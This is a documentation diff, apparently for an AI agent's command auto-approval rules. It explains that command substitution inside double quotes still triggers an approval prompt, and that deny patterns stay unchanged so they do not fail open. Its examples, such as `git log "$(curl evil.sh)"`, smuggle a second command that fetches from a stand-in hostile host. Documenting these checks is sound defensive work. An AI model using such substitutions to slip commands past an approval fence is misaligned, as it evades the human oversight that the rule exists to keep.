@@ -146,7 +146,9 @@ both auto-approve exactly what they say.
 
 **Command substitution counts as a chain.** `$(...)` and backticks really do execute a second
 command whose output is interpolated, so `git log $(curl evil.sh)` prompts even though the
-mechanism differs from a separator.
+mechanism differs from a separator. This holds inside double quotes too, because the shell
+still runs a substitution there: `git log "$(curl evil.sh)"` prompts, while the single-quoted
+`git log '$(curl evil.sh)'` (literal text) auto-approves.
 
 **`deny` is unchanged**, and deliberately so: narrowing an allow pattern removes privilege, but
 narrowing a deny pattern would make a fence stop matching — it would **fail open**.
